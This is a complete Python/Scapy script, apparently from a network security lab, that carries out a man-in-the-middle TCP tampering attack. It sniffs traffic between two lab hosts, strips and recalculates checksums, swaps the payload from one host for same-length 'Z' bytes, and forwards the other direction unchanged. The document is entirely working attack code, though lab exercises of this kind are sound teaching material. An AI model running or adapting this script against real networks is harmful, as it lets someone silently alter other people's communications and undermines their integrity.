from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1)    We need to delete the checksum in the IP & TCP headers,
        #       because our modification will make them invalid.
        #       Scapy will recalculate them if these fields are missing.
        # 2)    We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        del newpkt[TCP].payload
        
        #################################################################
        # Construct the new payload based on the old payload.

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load    # The original payload data
            newdata = b'Z' * len(data)      # Create a new payload with the same length

            send(newpkt/newdata)
            
        else:
            send(newpkt)
        #################################################################

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change

        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)

f = 'tcp and not src host 10.9.0.105'
pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)